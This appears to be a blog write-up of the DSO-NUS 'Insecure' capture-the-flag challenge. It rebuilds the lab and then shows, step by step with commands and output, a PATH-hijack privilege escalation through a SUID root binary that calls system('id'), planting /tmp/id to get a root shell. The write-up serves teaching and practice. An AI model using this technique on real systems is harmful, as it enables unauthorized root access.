---
title: DSO NUS CTF - Insecure
date: 2021-08-02 17:19:00 +0800
categories: [ctf]
tags: [linux, suid]
---

# Description

> Someone once told me that SUID is a bad idea. Could you show me why?
> 
> This challenge server can be accessed here:
> 
> (Any one of the options below is fine)
> (Suggested access via '`nc`')  
> `nc ctf-85ib.balancedcompo.site 9999`  
> `nc ctf-sn3y.balancedcompo.site 9999`  
> `nc ctf-rv6w.balancedcompo.site 9999`  
> `nc ctf-ptb1.balancedcompo.site 9999`  
> `nc ctf-f3jj.balancedcompo.site 9999`  
> `nc ctf-4q22.balancedcompo.site 9999`  
> `nc ctf-7jca.balancedcompo.site 9999`  
> `nc ctf-ea38.balancedcompo.site 9999`  
> `nc ctf-jfi4.balancedcompo.site 9999`  
> `nc ctf-ks5n.balancedcompo.site 9999`  
> 
> Files (Any of the links are fine):  
> [insecure](/assets/misc/insecure)
> 
> *Debug the Pwn challenges locally on your system before connecting to the remote challenge server to exploit and get the flag.
> 
> Flag format conversion may have to be done for this challenge (Refer to notifications)

# Recreating the environment

Note: Make sure to run the below commands as `root`.

## 1. Creating a fake flag

There was a file called `flag.txt`, which contained the flag and was located at the root directory so lets create it.

```bash
$ echo -n "DSO-NUS{FAKE_FLAG}" > /flag.txt
```

Make sure that no other users are able to read it.

```bash
$ chmod 700 /flag.txt
```

## 2. Installing the `insecure` binary 

Download the `insecure` binary from any of the download links and copy it to the `/bin` directory.

```bash
$ cp /root/Downloads/insecure /bin/insecure
```

Assign the appropriate permissions and set the owner to `root`.

```bash
$ chown root:root /bin/insecure
$ chmod 755 /bin/insecure
```

Make sure to also set the `SUID` bit.

```bash
$ chmod u+s /bin/insecure
```

Verify that the permissions should look like this:

```bash
$ ls -al /bin/insecure             
-rwsr-sr-x 1 root root 6848 Mar  5 09:35 /bin/insecure
```

## 3. Logging in as an unprivileged user

Create a new user that the contestants will privilege escalate from.

```bash
$ useradd -s /bin/bash unprivileged
```

Switch user to this new user before starting the challenge.

```bash
$ su unprivileged
```

# Solution

After `nc`-ing to any one of the endpoints, we instantly get a shell as a low-privileged user.

```bash
unprivileged@kali:/$ id
uid=1001(unprivileged) gid=1001(unprivileged) groups=1001(unprivileged)
```

In the root directory, we see that there is a file called `flag.txt` but we did not have the permissions to read it.

```bash
unprivileged@kali:/$ ls -al /flag.txt
-rwx------ 1 root root 18 Mar  5 09:46 /flag.txt
unprivileged@kali:/$ cat /flag.txt
cat: /flag.txt: Permission denied
```

In the `/bin` directory, there was a binary called `insecure`, which did not seem like something that you normally see on Linux systems.

```bash
unprivileged@kali:/$ ls -al /bin/insecure
-rwsr-sr-x 1 root root 6848 Mar  5 09:35 /bin/insecure
```

We see that we have the permission to execute it so lets try executing it.

```bash
unprivileged@kali:/$ /bin/insecure
I am a SUID binary and can run in varying levels of privilege!

Now, I run in a less privileged context.
uid=1001(unprivileged) gid=1001(unprivileged) groups=1001(unprivileged)

Next, I wil run in a more privileged context.
uid=0(root) gid=1001(unprivileged) groups=1001(unprivileged)

Once I am done, as a good practice, I should return my privileges.
And I run in a less privileged context again.
uid=1001(unprivileged) gid=1001(unprivileged) groups=1001(unprivileged)
```

On closer inspection of the output, we can break down what it is actually doing:

1. In the current low-privileged context, it runs the `id` command.
2. It then shifts to a high-privileged context and runs the `id` command again to show that it is running as `root`.
3. It then shifts back to the low-privileged context and runs the `id` command to show that it has returned back to the original context.

This is actually made possible due to the `SUID` bit that was set on the `insecure` binary which can be seen in the `s` in the permissions.

```bash
unprivileged@kali:/$ ls -al /bin/insecure
-rwsr-xr-x 1 root root 6848 Mar  5 09:35 /bin/insecure
```

The `SUID` bit allows other users to run the `insecure` binary as the owner of the file, which in this case is `root`.

To better understand the underlying implementation of the `insecure` binary, we can retrieve a copy of it from the download links provided and run the `ltrace` command to list out the library calls performed by the binary.

```bash
$ ltrace insecure 
...
system("id"uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),133(scanner),141(kaboxer),998(docker)
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                   
...
system("id"uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),133(scanner),141(kaboxer),998(docker)
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                   
...
system("id"uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),133(scanner),141(kaboxer),998(docker)
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                           = 0
+++ exited (status 0) +++
```

We see that the `id` command was indeed being executed via the `system()` library call, but note that the path of the `id` command is not absolute. 
This means we can perform `PATH` injection to trick the system into running an `id` binary of our choice.

In the shell as the unprivileged user, create a file called `id` in the `/tmp` directory and enter `/bin/bash` into it.

```bash
unprivileged@kali:/$ echo "/bin/bash" > /tmp/id
```

Assign the appropriate permission to make sure any users are able to execute it.

```bash
unprivileged@kali:/$ chmod 777 /tmp/id
```

Now run the `insecure` binary but alter the `PATH` variable such that the system will look for the `id` binary from `/tmp` first.

```bash
unprivileged@kali:/$ PATH=/tmp:$PATH /bin/insecure
I am a SUID binary and can run in varying levels of privilege!

Now, I run in a less privileged context.
unprivileged@kali:/$
```

Enter `exit` and we will get a shell as `root`.

```bash
unprivileged@kali:/$ exit
exit

Next, I wil run in a more privileged context.
root@kali:/# /usr/bin/id
uid=0(root) gid=1001(unprivileged) groups=1001(unprivileged)
```

We can now read the contents of the flag.

```bash
root@kali:/# cat /flag.txt
DSO-NUS{FAKE_FLAG}
```